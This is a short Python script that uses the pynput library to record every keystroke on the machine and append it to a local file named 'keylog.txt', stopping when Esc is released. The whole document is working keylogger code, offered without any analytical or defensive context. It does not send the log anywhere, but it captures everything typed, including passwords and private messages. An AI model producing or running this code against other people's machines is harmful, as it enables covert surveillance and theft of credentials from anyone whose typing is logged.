import pynput.keyboard

# Define a function to write the keystrokes to a file
def write_to_file(key):
    keydata = str(key)
    with open("keylog.txt", "a") as f:
        f.write(keydata)
        
# Define a function to handle pressed keys
def on_press(key):
    try:
        write_to_file(key.char)
    except AttributeError:
        write_to_file(" " + str(key) + " ")

# Define a function to handle released keys
def on_release(key):
    if key == pynput.keyboard.Key.esc:
        return False

# Start listening for key presses
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
